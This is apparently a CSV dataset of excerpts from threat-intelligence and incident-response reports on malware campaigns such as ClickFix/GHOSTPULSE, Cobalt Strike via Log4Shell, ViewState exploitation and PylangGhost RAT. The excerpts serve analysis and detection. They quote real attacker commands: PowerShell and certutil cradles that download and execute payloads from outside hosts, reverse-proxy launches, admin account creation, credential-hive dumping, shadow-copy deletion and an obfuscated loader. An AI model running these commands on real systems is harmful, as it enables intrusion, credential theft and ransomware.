Column1,Column2
Post exploitation Huntress has also observed threat actors attempting to use encoded PowerShell to download and sideload a DLL via a commonly used cradle technique: Command: powershell.exe -encodedCommand REDACTEDBASE64PAYLOAD== Cleartext: Invoke-WebRequest -uri http://REDACTED:REDACTED/d3d11.dll -outfile C:UsersPublicREDACTEDd3d11.dll Command: Invoke-WebRequest -uri http://redacted:redacted/Centre.exe -outfile C:UsersPublicRedactedCentre.exe,
"This Centre.exe executable, likely named after the vulnerability, is a renamed ‚ÄúWallpaper Engine Launcher‚Äù from Kristjan Skutta originally named launcher.exe. It should also be noted that the d3d11.dll file is the same file previously reported in our recent CrushFTP blog",
"This Centre.exe executable, likely named after the vulnerability, is a renamed ‚ÄúWallpaper Engine Launcher‚Äù from Kristjan Skutta originally named launcher.exe. It should also be noted that the d3d11.dll file is the same file previously reported in our recent CrushFTP blog",
Post exploitation Huntress has also observed threat actors attempting to use encoded PowerShell to download and sideload a DLL via a commonly used cradle technique: Command: powershell.exe -encodedCommand REDACTEDBASE64PAYLOAD== Cleartext: Invoke-WebRequest -uri http://REDACTED:REDACTED/d3d11.dll -outfile C:UsersPublicREDACTEDd3d11.dll Command: Invoke-WebRequest -uri http://redacted:redacted/Centre.exe -outfile C:UsersPublicRedactedCentre.exe,
"the Centre.exe executable connected to these IP addresses: 104.21.16[.]1 104.21.48[.]1 Threat actors have also been observed performing lateral movement and performing installation of remote access tooling, namely MeshCentral.",
a PowerShell based downloader executed a Cobalt Strike payload that was configured to call back to 185.112.83[.]116 for command and control.iex ((New-Object http://System.Net.WebClient).DownloadString('http://185.112.83[.]116:8080/drv'))At ,
"Detection TipsFor those of you just learning about the mass exploitation of VMware Horizon servers and the installation of backdoor web shells, you should seriously consider the possibility that your server is compromised if it was unpatched and internet-facing. To help you determine your status, we strongly suggest you perform the following actions:Run VMware‚Äôs Horizon Mitigation tool to report whether there is a vulnerable Log4J library or child_process based web shell present under the installation location with the following command: Horizon_Windows_Log4j_Mitigation.bat /verboseManually inspect/assess the files within %ProgramFiles%\VMware\VMware View\Server\appblastgateway\ for the presence of the child_process string as pictured here.Review historical records for evidence of node.exe or ws_TomcatService.exe spawning abnormal processes to include PowerShell.",
"Despite mass exploitation of VMware Horizon to deliver web shells, our data suggests today's Cobalt Strike deployments were exploitation of Horizon itself and not the abuse of web shells. This conclusion is largely based on analysis of the PowerShell payload's parent process where web shell abuse spawns from node.exe while exploitation of Log4Shell in Horizon spawns from ws_tomcatservice.exe as pictured.",
" A firewall rule allowing inbound SSH connections Dropped the SSH executable in that folder Persistence in the form of a scheduled task A file called go.bat, which was used to run the following batch scriptWe can briefly dwell on the batch script, which created the reverse shell listener back to the IP we saw in the original script‚Äîall while creating persistence in the form of a scheduled task to launch the SSH reverse shell listener so the attacker would always have access to it",
"Spawned under the w3wp.exe (IIS worker process), we observed PowerShell syntax like the following:On other endpoints, we observed certutil commands similar to the following:certutil -urlcache -f http://103.163.187.12:8080/cz3eKnhcaD0Fik7Eexo66A C:\WINDOWS emp\zpvmRqTOsP.exe",
"We observed two infrastructures (both resolving to 50.57.243[.]90) https://clients[.]dealeronlinemarketing[[.]]com/captcha/ and https://clients[.]contology[.]com/captcha/ that deliver the same initial payload. User interaction on this page initiates execution. GHOSTPULSE serves as the malware loader in this campaign. Elastic Security Labs has been closely tracking this loader, and our previous research (2023 and 2024) provided a detailed look into its initial capabilities. The webpage is a heavily obfuscated JavaScript script that generates the HTML code and JavaScript, which copies a PowerShell command to the clipboard. Inspecting the runtime HTML code in a browser, we can see the front end of the page, but not the script that is run after clicking on the checkbox Verify you are human. A simple solution is to run it in a debugger to retrieve the information during execution. The second JS code is obfuscated, but we can easily identify two interesting functions. The first function, runClickedCheckboxEffects, retrieves the public IP address of the machine by querying https://api.ipify[.]org?format=json, then it sends the IP address to the attacker‚Äôs infrastructure, https://koonenmagaziner[.]click/counter/, to log the infection. The second function copies a base64-encoded PowerShell command to the clipboard. Which is the following when it is base64 decoded (Invoke-webrequest -URI 'https://shorter[.]me/XOWyT' -UseBasicParsing).content | iex When executed, it fetches the following PowerShell script: Invoke-WebRequest -Uri ""https://bitly[.]cx/iddD"" -OutFile ""$env:TEMP\ComponentStyle.zip""; Expand-Archive -Path ""$env:TEMP/ComponentStyle.zip"" -DestinationPath ""$env:TEMP""; & ""$env:TEMP\crystall\Crysta_x86.exe"" The observed infection process for this campaign involves GHOSTPULSE's deployment as follows: After the user executes the PowerShell command copied by ClickFix, the initial script fetches and runs additional commands. These PowerShell commands download a ZIP file (ComponentStyle.zip) from a remote location and then extract it into a temporary directory on the victim's system. Extracted contents include components for GHOSTPULSE, specifically a benign executable (Crysta_X64.exe) and a malicious dynamic-link library (DllXDownloadManager.dll). This setup utilizes DLL sideloading, a technique in which the legitimate executable loads the malicious DLL. The file (Heeschamjet.rc) is the IDAT file that contains the next stage's payloads in an encrypted format and the file Shonomteak.bxi, which is encrypted and used by the loader to fetch the stage 2 and configuration structure.",
" The ARECHCLIENT2 malware connects to its C2 144.172.97[.]2, which is hardcoded in the binary as an encrypted string, and also retrieves its secondary C2 (143.110.230[.]167) IP from a hardcoded pastebin link https://pastebin[.]com/raw/Wg8DHh2x. Infrastructure analysis The malicious captcha page was hosted under two domains clients.dealeronlinemarketing[.]com and clients.contology[.]com under the URI /captcha and /Client pointing to the following IP address 50.57.243[.]90. We've identified that both entities are linked to a digital advertising agency with a long operational history. Further investigation reveals that the company has consistently utilized client subdomains to host various content, including PDFs and forms, for advertising purposes. We assess that the attacker has likely compromised the server 50.57.243[.]90 and is leveraging it by exploiting the company's existing infrastructure and advertising reach to facilitate widespread malicious activity. Further down the attack chain, analysis of the ARECHCLIENT2 C2 IPs (143.110.230[.]167 and 144.172.97[.]2) revealed additional campaign infrastructure. Both servers are hosted on different autonomous systems, AS14061 and AS14956. ",
"Technical Analysis of installer, GoogIe LLC, and CoreKitAgent Installer The second part of the attack chain begins with the installer binary dropped alongside a by the initial access scripts. Compiled from Nim and weighing in at ~233KB, the installer binary is a universal architecture Mach-O with an ad hoc signature and the identifier user_startup_installer_arm64. The installer binary checks for the existence of a LaunchAgent at [~]/Library/LaunchAgents/com.google.update.plist and creates folder paths at [~]/Library/CoreKit/ and [~]/Library/Application Support/GoogIe LLC/ for use by the later stages described in the following sections. The installer binary prepares the file paths for later stages The misspelling of GoogIe LLC (uppercase ‚Äòi‚Äô, not lowercase ‚ÄòL‚Äô) is intended to help the malware blend in and avoid suspicion.",
" One version of installer uses /private/tmp/cfg (06566eabf54caafe36ebe94430d392b9cf3426ba) while the other uses /private/tmp/.config (08af4c21cd0a165695c756b6fda37016197b01e7). Two versions of the installer binary are identical save for the embedded config file path In both cases, installer checks that the file does not exist, then writes a 0 byte file to the path, setting write-only access (O_WRONLY) on the file. The file path contents are populated by the next stage GoogIe LLC and later read by CoreKitAgent. GoogIe LLC Compiled from Nim and approximately 195KB, the GoogIe LLC executable is a universal Mach-O bearing an ad hoc code signature with the identifier user_startup_loader_arm64. Interestingly, only the filename for this stage uses the typo spoofing trick; the parent folder /Google LLC/ spells Google correctly with a lowercase ‚ÄúL‚Äù. ~/Library/Application Support/Google LLC/GoogIe LLC The binary‚Äôs primary function is to set up a configuration file and launch the next stage, CoreKitAgent. The GoogIe LLC executable contains hardcoded data that is combined with local environmental data, encoded, and then written out to the config file in /private/tmp. Hardcoded data encrypted and written out to a hidden file /private/tmp/.config The resulting config file contains a 298 byte string of hexadecimal characters. This is later read by CoreKitAgent, which is responsible for writing the LaunchAgent to disk using com.google.update.plist for the Label key and the GoogIe LLC binary for the program argument. The data written to the config file is used as the value for the LaunchAgent‚Äôs CLIENT_AUTH_KEY key. The LaunchAgent contains customized Client and Server keys for communication with the C2 The first 47 characters of the value of CLIENT_AUTH_KEY are also identical to the first 47 characters (of the total 86) used for the value of SERVER_AUTH_KEY. When the LaunchAgent is activated by a user login or reboot, GoogIe LLC is launched, which in turn calls CoreKitAgent and the rest of the payload logic. Execution chain once the persistence mechanism is activated by a login or reboot CoreKitAgent Of the four Nim binaries observed, CoreKitAgent is the most technically complex. ",
"Two of these incidents involved attackers that were organized with identical commands, and the other incident was probably still in ‚Äúresearch mode.‚Äù The attackers‚Äô commands may be seen in the following gist. Loading Gist... The less organized commands pertained of two separate reconnaissance commands: cmd.exe /c whoamicmd.exe /c arp -a What was interesting is that the attacker on the first host seemed to run into some difficulty getting their service to run on the first host with the scripted commands. Since the service didn‚Äôt start, they tried the attack again. However, the service still didn‚Äôt start despite their best efforts. This was confirmed by examining the System event log, and finding an entry that showed the service failed to start after it was installed: The first attempt at installing the service (Event ID 7045) as illuminated in the event log: [snip] 7045 [snip] [snip] PHP5.3.8 C:\MagicInfo Premium\tomcat\bin\php-cli.exe user mode service auto start LocalSystem [snip] The second attempt at installing the service: [snip] 7045 [snip] [snip] PHP5.3.8 C:\MagicInfo Premium\tomcat\bin\php-cli.exe user mode service auto start LocalSystem The service fails to start, shown by Event ID 7000: [snip] 7000 [snip] [snip] PHP5.3.8 %%2 UABIAFAANQAuADMALgA4AAAA # translates to PHP5.3.8 [snip] For the second host, there was only one entry that showed that the service was installed, and there was no entry showing that it failed. There was also proof of execution of the downloaded binaries from EDR data showing the service running. Figure 1: An overview of the three attacks, in meme form Another curious thing about the attackers‚Äô commands was the fact that while they pulled an executable that was originally named srvany.exe from their staging website, they appeared to have named it as php-cli.exe on the victim‚Äôs machine. They downloaded an executable named php_cli.exe, and renamed it as php-fpm.exe i",
"A Recent ExampleHuntress analysts recently detected an incident that was likely the result of a phishing email. A seemingly innocent zipped archive was found in the user‚Äôs Downloads folder, which was named for a potential customer and contained information related to tax issues. Further review of the user‚Äôs Downloads folder indicated that they regularly received zipped archive files pertaining to tax forms, tax issues, W2 forms, etc., as part of their business role within the customer‚Äôs organization. The archive contained two files, my tax.mp4 and a Windows shortcut file, illustrated in Figure 1, named tax_file.Figure 1: ‚ÄúTax_file‚Äù Windows shortcut/LNK fileAt this point, all indications are that the user expects to receive zipped archives containing files related to taxes, meaning that so far, nothing appears to be amiss and no alarm bells are ringing yet. The command embedded within the Windows shortcut file is obfuscated, and launches PowerShell with the following arguments:. $env:C:\W*\S*2\m*h?a.* 'https[:]//transfer.sh/get/RzbMK13oyI/p.hta'When executed on the system, the command appears as follows:""C:\Windows\System32\Mshta.exe"" https[:]//transfer.sh/get/RzbMK13oyI/p.htaHuntress detects this as ‚ÄúMSHTA Downloading Remote Payload‚Äù.The execution of the HTA file leads to the creation of a BITS Client job to download and execute a batch file (file containing a list of commands), which Huntress detects as ‚ÄúSuspicious BITSAdmin Commonly Abused Directories‚Äù.The batch file contents appear as follows:@echo offset url=https://transfer.sh//mail.zipset url2=https://transfer.sh//W2.pdfpowershell -WindowStyle Hidden -Command ""Invoke-WebRequest -Uri %url2% -OutFile %temp%\W2.pdf""cd %temp%start W2.pdfpowershell -WindowStyle Hidden -Command ""Invoke-WebRequest -Uri %url% -OutFile %temp%\mail.zip""powershell -WindowStyle Hidden -Command ""Expand-Archive -Path %temp%\mail.zip -DestinationPath %temp%\mail -Force""cd %temp%\mailstart mail.com Huntress detects the two PowerShell commands for downloading files as ‚ÄúSuspicious Download Via Transfer.sh‚Äù. ",
"ansomware Deployment AttemptsOn both endpoints, the initial ransomware deployment started with a DOS batch file run from the user‚Äôs desktop:C:\Users\user\Desktop\PP.batThis batch file, in turn, ran the following rundll32.exe command:rundll32 C:\Users\user\Desktop\LB3_rundll32_pass.dll,gdll -pass <32-char password>The ransomware impact on endpoint A was not simply limited, but limited to just that endpoint. However, on endpoint B, installed security software inhibited the threat actor‚Äôs progress and required them to make alternate attempts to encrypt files on the endpoint. Following log messages indicating that the above DLL file was quarantined, the threat actor made several attempts to launch the following file before it was quarantined by security software:C:\Users\user\Desktop\LB3.exeInstalled security software quarantined the following file before any apparent attempt to execute it:C:\Users\user\Desktop\ZZZZZZZAfter this point in the logs, no additional threat actor activity was observed during the login session.",
"The Huntress SOC team flagged a user Run Key value with the name ‚ÄúxmNusBQH4865,‚Äù which in and of itself was suspicious. The command executed was equally suspect:Regsvr32.exe /s C:\programdata\xmNusBQH4865.dllAs for the DLL payload, we cross-referenced its hash in VirusTotal and discovered it hadn‚Äôt been seen before:",
"Initial access to target networks is accomplished by exploiting a vulnerability, likely an SQL injection flaw, after which PowerShell is used to deliver additional tools hosted on a staging server (""868id[.]com""). ""This conjecture is supported by our observation that most unauthorized PowerShell executions originated from the binary sqlserver.exe, which holds a stored procedure xp_cmdshell that can be used to execute commands on a machine,"" ESET said. Rungan is designed to await incoming requests from a URL matching a predefined pattern (i.e., ""https://+:80/v1.0/8888/sys.html""), and then proceeds to parse and execute the commands embedded in them.",
"Host Reconnaissance After obtaining the key server configuration files, the threat actor proceeded to fingerprint the compromised server through host and network reconnaissance, including but not limited to enumerating running processes, services, user accounts, TCP/IP configurations, and active network connections.whoami hostname net user tasklist ipconfig /all tasklist /svc netstat -ano nslookup net group domain admins net localgroup administratorsStaging Directory The threat actor leveraged public directories such as Music and Video for staging and deploying their tooling. Files written into the Public directory include: File: C:\Users\Public\Music\7za.exe ",
"In one instance where the file 1.vbs was retrieved, it contained a simple VBS code to launch the EARTHWORM. Set shell = CreateObject(""WScript.Shell"") shell.CurrentDirectory = ""C:\Users\Public\Music"" shell.Run ""ufp.exe -s rssocks -d 130.33.156[.]194 -e 443"", 1, False ",
"The threat actor leveraged a privilege escalation tool to create the local administrator account, asp$. The naming convention mimicking an ASP.NET service account with a common suffix $ suggests an attempt to blend in and evade detection. ""C:\Users\Public\Music\helper.exe"" ""net user asp$ {REDACTED} /add"" ""C:\Users\Public\Music\helper.exe"" ""net localgroup administrators asp$ /add"" sawadmin: At a later stage, the threat actor established a DWAGENT remote session to create a second local administrator account. net user sawadmin {REDACTED} /add net localgroup administrators sawadmin /addProcess Token Theft Attempt The threat actor was observed executing a binary named GoToken.exe under the context of sawadmin with the following command-line arguments:GoToken.exe -h GoToken.exe -l GoToken.exe -ah GoToken.exe -tWhile Mandiant was unable to recover the GoToken.exe binary from the server, the filename and arguments strongly suggest it is the public Go-based token-stealing tool GoTokenTheft. This tool is designed to execute commands using the security context of other users on a system.",
"The activities associated with each account are as follows: asp$ reg save hklm\SYSTEM c:\users\public\system.hive reg save hklm\SAM c:\users\public\sam.hive sawadmin reg save hklm\SYSTEM SYSTEM.hiv reg save hklm\SAM SAM.hivMaintain Presence The threat actor maintained persistence through a combination of methods, leveraging both created and compromised administrator credentials for RDP access. Additionally, the threat actor issued commands to maintain long-term access to accounts. This included modifying settings to disable password expiration for administrative accounts of interest:net user /passwordchg:no /expires:never wmic useraccount where name='' set PasswordExpires=False For redundancy and continued remote access, the DWAGENT tool was also installed. Remote Desktop Protocol The actor used the Remote Desktop Protocol extensively. The traffic was routed through a reverse SOCKS proxy created by EARTHWORM to bypass security controls and obscure their activities. In one RDP session, the threat actor under the context of the account asp$ downloaded additional attacker tooling, dwagent.exe and main.exe, into C:\Users\asp$\Downloads. File Path MD5 Description C:\Users\asp$\Downloads\dwagent.exe n/a DWAgent installer C:\Users\asp$\Downloads\main.exe be7e2c6a9a4654b51a16f8b10a2be175 Downloaded from hxxp://130.33.156[.]194/main.exe Table 1: Files written in the RDP sessionRemote Access Tool: DWAGENT DWAGENT is a legitimate remote access tool that enables remote control over the host. DWAGENT operates as a service with SYSTEM privilege and starts automatically, ensuring elevated and persistence access. During the DWAGENT remote session, the attacker wrote the file GoToken.exe. The commands executed suggest that the tool was used to aid in extracting the registry hives. File Path MD5 Description C:\Users\Public\Music\GoToken.exe 62483e732553c8ba051b792949f3c6d0 Binary executed prior to dumping of SAM/SYSTEM hives. Table 2: File written in the DWAgent remote session Internal Reconnaissance Active Directory Reconnaissance During a DWAGENT remote session, the threat actor executed commands to identify Domain Controllers within the target network. The actor then accessed the sysvol share on these identified DCs to search for cpassword within Group Policy Object (GPO) XML files. This is a well-known technique attackers employ to discover privileged credentials mistakenly stored in a weakly encrypted format within the domain.nltest /DCLIST: nslookup findstr /S /l cpassword \\\sysvol\dcext.local\policies\*.xmlSHARPHOUND The threat actor then transitioned to a new RDP session using a legitimate administrator account. From this session, SHARPHOUND , the data collection component for the Active Directory security analysis platform BLOODHOUND, was downloaded via a browser and saved to C:\Users\Public\Music\sh.exe. Following the download, the threat actor returned to the DWAGENT remote session and executed sh.exe, performing extensive Active Directory reconnaissance. sh.exe -c allOnce the reconnaissance concluded, the threat actor switched back to the RDP session (still using the compromised administrator account) to archive the SharpHound output, preparing it for exfiltration.C:\Program Files\7-Zip\7zFM.exe ""C:\Users\Public\Music\_BloodHound.zip""Accounts Cleanup With administrator accounts compromised, the earlier created asp$ and sawadmin accounts were removed, signaling a shift to more stable and covert access methods. Move Laterally The compromised administrator accounts were used to RDP to other hosts. On these systems, the threat actor executed commands to continue their reconnaissance and deploy EARTHWORM. On one host, the threat actor logged in via RDP using a compromised admin account. Under the context of this account, the threat actor then continued to perform internal reconnaissance commands such as:quser whoami net user /domain nltest /DCLIST: nslookup Recommendations Mandiant recommends following security best practices in ASP.NET, including implementing automated machine key rotation, enabling View State Message Authentication Code (MAC), and encrypting any plaintext secrets within the web.config file. For more details, refer to the following resources: ASP.NET Core security topics What not to do in ASP.NET, and what to do instead Improved ASP.NET view state security and key management Code injection attacks using publicly disclosed ASP.NET machine keys For detailed Sitecore remediation instructions, refer to the official Sitecore advisory SC2025-005. Indicators of compromise The following indicators of compromise are available in a Google Threat Intelligence (GTI) collection for registered users. Accounts Accounts Description asp$ Created account sawadmin Created account h496883 Workstation from the source of the RDP connection File-Based MD5 SHA-256 Description 117305c6c8222162d7246f842c4bb014 a566cceaf9a66332470a978a234a8a8e2bbdd4d6aa43c2c75c25a80b3b744307 WEEPSTEEL (Information.dll) a39696e95a34a017be1435db7ff139d5 b3f83721f24f7ee5eb19f24747b7668ff96da7dfd9be947e6e24a688ecc0a52b EARTHWORM (lfe.ico, ufp.exe, ufp.ico) f410d88429b93786b224e489c960bf5c n/a Helper.ico, helper.exe 1.vbs be7e2c6a9a4654b51a16f8b10a2be175 n/a main.exe 62483e732553c8ba051b792949f3c6d0 n/a GoToken.exe 63d22ae0568b760b5e3aabb915313e44 61f897ed69646e0509f6802fb2d7c5e88c3e3b93c4ca86942e24d203aa878863 SharpHound Network-Based IP 130.33.156[.]194:443 130.33.156[.]194:8080 103.235.46[.]102:80 ",
User Created With No Password Expiration ,
"ViewState deserialization attacks exploit the server's willingness to deserialize ViewState messages when validation mechanisms are either absent or circumvented. When machine keys (which protect ViewState integrity and confidentiality) are compromised, the application effectively loses its ability to differentiate between legitimate and malicious ViewState payloads sent to the server. Local web server (IIS) logs recorded that the threat actor's attack began by sending an HTTP POST request to the blocked.aspx endpoint, which was met with an HTTP 302 ""Found"" response. This web request coincided with a ""ViewState verification failed"" message in Windows application event logs (Event ID 1316) containing the crafted ViewState payload sent by the threat actor:Log: Application Source: ASP.NET 4.0.30319.0 EID: 1316 Type: Information Event code: 4009-++-Viewstate verification failed. Reason: Viewstate was invalid. ViewStateException information: Exception message: Invalid viewstate. Client IP: User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0) chromeframe/10.0.648.205 Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 PersistedState: <27760 byte encrypted + base64 encoded payload> Referer: Path: /sitecore/blocked.aspxThis demonstrates the threat actor‚Äôs knowledge of the server‚Äôs machine key, allowing them to craft malicious viewstate requests using tools like the public ysoserial.net project. ",
" PylangGhost RAT ATT&CK Details PylangGhost RAT shares several tactics, techniques, and procedures (TTPs) with its related families, OtterCookie, InvisibleFerret, and BeaverTail but also introduces some new ones: T1036 Masquerading Renames legitimate binaries such as python.exe to csshost.exe. T1059 Command and Scripting Interpreter Initiates execution by using Wscript.exe to run update.vbs and csshost.exe to launch the nvidia.py loader. T1083 Files and Directory Discovery Enumerates user profiles and browser extensions. T1012 Query Registry Gains persistence via registry entries created by the update.vbs script. ",
"Htxp0623Exchange, which simply posts the packet to the server without TLS encryption, thus making the RC4 and MD5 cocktail an even weaker choice. Package building using RC4 Now command.py acts as a dispatcher, interpreting both malware logic and C2 communications, and executing instructions accordingly. It also handles status messages defined in the config.py module we examined earlier. The key functions are: Function Description ProcessInfo Collects the current user, hostname, OS, architecture, and the malware (daemon) version. ProcessUpload Allows the attacker to upload compressed files to the victim‚Äôs machine. ProcessDownload Stages files or folders for exfiltration. If the target is a folder, it gets compressed before transmission. ProcessTerminal Opens a reverse shell or executes arbitrary commands, depending on the mode selected. makeMsg0623 / decodeMsg0623 Serialize and deserialize base64-encoded messages exchanged between implant and C2. ProcessAuto: Triggers automation routines from the auto.py module Function to open a reverse shell or run arbitrary commands You probably remember that command.py imports two other custom modules: util.py and auto.py. Let‚Äôs review them as well. Module util.py implements three functions: Function Description com0715press Compresses files in-memory as .tar.gz decom0715press Extracts .tar.gz files from memory to disk valid0715relPath Validates routes to prevent path transversal Auxiliary functions from util.py Finally, the last and most critical module: auto.py. This module implements two key functions: AutoGatherMode: Collects configuration data from cryptocurrency browser extensions such as MetaMask, BitKeep, Coinbase Wallet, and Phantom. AutoCookieMode: Extracts login artifacts, including credentials and cookies, from Google Chrome. The autoGatherMode function searches for the user‚Äôs Google Chrome profile directory (appdata\Local\Google\Chrome\User Data), starting with the Default profile and then enumerating others. It compresses the configuration directories of the targeted extensions into a single archive named gather.tar.gz and exfiltrates it for manual analysis, with the goal of enabling account takeover or compromising cryptocurrency wallets.",
"Monitoring for PsExeSVC.exe to pop up somewhere in your environment is a great opportunity for detection. A PsExec connection will instigate an EventID 7045 (Service) on the target machine‚Äôs System.evtx for PsExeSVC. It will offer the connection time for us to focus on, as well as confirm the user account via SID (which I‚Äôll show you how to convert in a minute).But note, adversaries can control the service name by using the `-r` flag on PsExec, and is therefore not a foolproof method of detection. Now we have spent some time on PsExec and gathered ourselves a few basic facts about investigating, let's take it up a notch and see what artefacts we can triangulate to tell a fuller story.EULA Accepted in the RegistryAttackers can try to change the name of the PsExec executable itself to evade detection, but something they‚Äôre less likely to evade will be the impact on the Windows registry. We can take a look in our registry for the EulaAccepted, which will appear with the value of ‚Äò1‚Äô if PsExec has been dropped on this machine and the EULA pop-up has been accepted.We can look across the registry from HKEY_USERS to identify which user accounts (via their SIDs) have leveraged PsExec.HKEY_USERS\S-*\Software\Sysinternals\PsExec",
" This represents a hard requirement with no bypass mechanism, as the ransomware requires administrative privileges to terminate system processes, delete volume shadow copies Cmd.exe /c vssadmin delete shadows /all /quiet, and access system APIs necessary for domain detection and daemon process creation.",
"Organizations should monitor their domain controllers closely and look for the addition of new files, as well as the modification of existing files, including GPOs. Administrators should also monitor domain controllers, as well as other endpoints (servers, workstations) for unusual or suspicious access. ",
" However, what we were able to see was that the ransomware executable was found on the domain controller, in the path: C:\WINDOWS\sysvol\sysvol\[domain].local\scripts\ In the incident observed by the Huntress SOC, the ransomware executable file was named for the domain in which it was found, in an apparent attempt to blend in (for this reason, we are not publicly identifying the name of this executable). ",
"Persistence Settings To establish persistence, the loader creates a folder named RunTime under the system path C:\Program Files\RunTime . The all-in-one loader sample and the appropriate version of the vulnerable driver‚Äîselected based on the infected system‚Äôs Windows OS version‚Äîare dropped into this folder with the filenames RuntimeBroker.exe and Amsdk_Service.sys , respectively. Figure 3: Persistence settings ‚Äì Dropping files to the created ‚ÄúRunTime‚Äù folder. Subsequently, specific services are created to ensure the dropped files are executed automatically on system startup. The service named Termaintor is responsible for maintaining persistence for the previously dropped copy of the all-in-one loader ( RuntimeBroker.exe ). Figure 4: The creation of the ‚ÄúTermaintor‚Äù service. The second created service, Amsdk_Service , is simply a configured registry key required to load the dropped vulnerable driver. We believe the name Termaintor is a deliberate typographical error and also a possible indication that the EDR/AV killer logic was inspired by the publicly available PoC ‚Äîa tool named ‚Äú Terminator ‚Äù that abuses the known vulnerable Zemana Anti-Malware driver. Embedded Payloads While most globally defined strings in the analyzed sample are simply Base64-encoded, the embedded payloads use a combination of hexadecimal encoding and Base64. These payloads are embedded directly as encoded byte strings within the .rdata section of the binary. ",
"This shellcode includes a stub responsible for in-memory reflective loading and is injected into an already running process, typically an instance of svchost.exe . The internal name of the DLL, ‰∏äÁ∫øÊ®°Âùó.dll (translated as ‚Äú Online module.dll ‚Äù), is preserved in the Export Directory, along with three exported functions: load , run , and a second run .",
"Similar to the ValleyRAT downloader, the deployed ValleyRAT backdoor is delivered as a 64-bit DLL converted to shellcode (the DLL is preceded by stub shellcode responsible for in-memory reflective loading). The internal name ÁôªÂΩïÊ®°Âùó.dll (translated as ‚Äú LoginModule.dll ‚Äù) of this DLL is preserved in the Export Directory, along with a single exported function, run . ",
"The shellcode (often deobfuscated) is copied into this newly allocated memory region with a call to move() or alternatives The shellcode is launched using the creation of a new thread. With this technique, the shellcode will be executed in the context of the current process, but alternative techniques might, of course, load and execute the shellcode in a remote process. This technique is pretty well flagged by most EDRs.That's why Attackers are always looking for alternative ways to execute malicious code and defeat EDRs. I found a nice piece of PowerShell that implements such a technique! The PowerShell script is dropped by a Windows executable (SHA256:ec8ec8b3234ceeefbf74b2dc4914d5d6f7685655f6f33f2226e2a1d80e7ad488)[ 1 ]. It dumps many files, but two of them are interesting: C:\Users\REM\appdata\Roaming\Cafeterias108\butikscenters\Nonrepentance\menneskevrdige.Paa C:\Users\REM\appdata\Roaming\Cafeterias108\butikscenters\Skydeprammenes\Bogskrivninger70.Mde Then it launches the following command line: ""powershell.exe"" -windowstyle minimized ""$microcolorimetric=gc -Raw 'C:\Users\REM\appdata\Roaming\Cafeterias108\butikscenters\Skydeprammenes\Bogskrivninger70.Mde';$Hosiomartyr=$microcolorimetric.SubString(52695,3); Let's check the substring extracted by PowerShell: remnux@remnux:~/malwarezoo/20250825$ cut-bytes.py -d 52695:3l Bogskrivninger70.Mde iex iex (or ""Invoke-Expression"") is never good news in PowerShell scripts! The file Bogskrivninger70.Mde ",
"ZIP files The archive contains three files: Legitimate PDF and DOCX files used as lures, and a malicious LNK file responsible for initiating the execution chain. The ZIP archive itself contains a PowerShell script embedded directly within its binary content, which is later extracted and executed in memory by the .lnk -initiated payload. Interestingly, not all the ZIP files observed in this campaign were malicious. In several cases, the archive contained only harmless documents, with no embedded scripts or active payloads. This suggests that the malicious content may be dynamically served from the Herokuapp-hosted delivery domain, with the payload customized in real time based on factors such as the recipient‚Äôs IP address, user-agent, or other contextual indicators. Figure 6 ‚Äì NDA document used as a lure file. LNK Analysis The LNK file executes a PowerShell command that performs several coordinated actions: Locate the ZIP File Search for the original ZIP archive in several common folders: Desktop Downloads Documents Temp programdata Parent of current working dir Search for Embedded Script Marker After the ZIP file is located, the script scans the file for a hardcoded marker string ( xFIQCV ). This marker is used to identify the start of the embedded PowerShell payload within the ZIP‚Äôs binary data. Extract and Execute Embedded Script The PowerShell script: Extracts the embedded PowerShell payload from the ZIP. Copies the ZIP archive to the programdata folder and extracts it there. Opens the .docx file to maintain the appearance of legitimacy. ",
" ZIP PowerShell Analysis After the embedded PowerShell script is extracted and executed, it first substitutes placeholder values with the actual script file path and the .lnk shortcut path. Next, the script establishes persistence using the TypeLib hijacking technique . The TypeLib registry hive, which stores metadata about COM objects and their associated CLSIDs, is modified to target the CLSID {EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B} , an identifier tied to Microsoft Web Browser components. The script assigns this CLSID to point to a local file named Udate_Srv.sct . This .sct file is created by the PowerShell script and populated with a malicious XML scriptlet. The scriptlet content, originally Base64-encoded, is decoded and written to disk with the script: moniker. ",
"Therefore, it creates a shell and runs the command Cmd.exe /K set X=1&{cmd} while {cmd} is the .lnk file. The malware‚Äôs .lnk file will be re-executed automatically whenever the hijacked COM object is triggered, even if the payload was terminated. ",
"The subdomain names, likely generated by a domain generation algorithm (DGA), commonly include the word ‚Äúenvio‚Äù followed by a numeric part, as in, for example, envio16-05[.]duckdns[.]org. The names are detectable via the regex in Figure 2 and are detailed in Appendix B. envio[0-9\-]{2,5}\.duckdns\.org Figure 2: Regex for suspected DGA linked to Cluster 1 (Source: Recorded Future) ",
"the subdomain sudo102[.]lovestoblog[.]com hosted several text files that loaded an encoded PowerShell script, which retrieved the next stage of the infection chain from a JPG image hosted on archive[.]org. (See Figure 3 for the infection chain; line breaks were added for readability.) $craploads = 'SilentlyContinue' $islamist = 'https://archive[.]org/download/new_image_20250531_1942/new_image.jpg' $seiche = New-Object System.Net.WebClient $seiche.Headers.Add('User-Agent', 'Mozilla/5.0') [byte[]]$homophobes = $seiche.DownloadData($islamist) $rythmic = [System.Text.Encoding]::UTF8.GetString($homophobes) $protamphirhine = 'INICIO>>' $unrubberized = '<>' $petrograph = $ither $formylation = $rythmic.IndexOf($protamphirhine) $inconveniency = $rythmic.IndexOf($unrubberized) if ($formylation -ne -1 -and $inconveniency -ne -1 -and $inconveniency -gt $formylation) { $formylation += $protamphirhine.Length $petrograph = $rythmic.Substring($formylation, $inconveniency - $formylation) } $higgsinos = '#x#.e13ba2379fd20168b9c460418b963234_oviuqra/moc.golbo#sevol.201odus//:p##h' $higgsinos = $higgsinos.Replace('#', 't') $petrograph = $petrograph.Replace('@', 'A') $MacArthur = [System.Convert]::FromBase64String($petrograph) $aginator = [Reflection.Assembly]::Load($MacArthur) $towelette = [dnlib.IO.Home].GetMethod('VAI').Invoke( $ither, [object[]]@( $higgsinos, '', '', '', 'MSBuild', '', '', '', '', 'C:\Users\Public\Downloads', 'Mattagami', 'js', '', '', 'duparted', '2', '' ) ) Figure 3: Payload hosted on archive[.]org URL (Source: Recorded Future) At least one text file hosted on sudo102[.]lovestoblog[.]com included comments in Portuguese (for example, ‚ÄúJunta os comandos,‚Äù 